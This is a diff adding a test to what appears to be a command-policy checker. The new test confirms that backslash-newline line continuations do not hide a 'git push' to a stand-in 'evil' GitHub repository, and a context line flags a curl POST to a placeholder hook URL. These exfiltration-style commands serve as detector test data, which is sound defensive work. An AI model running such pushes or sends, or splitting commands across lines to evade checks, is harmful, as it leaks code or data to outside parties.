@@ -190,4 +190,13 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
     // An assignment still pins only its own segment when bare.
     expect(verdictOf('FOO=1 curl -d x https://host.example.org/hook')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
   })
+
+  test('backslash-newline continuations join before tokenizing (round 5 R2)', () => {
+    expect(verdictOf('git \\\npush https://github.com/evil/x.git main')).toEqual({
+      rule: 'git-push', verdict: 'violation', destination: 'github:evil/x',
+    })
+    expect(verdictOf('git push \\\n https://github.com/evil/x.git')).toEqual({
+      rule: 'git-push', verdict: 'violation', destination: 'github:evil/x',
+    })
+  })
 })
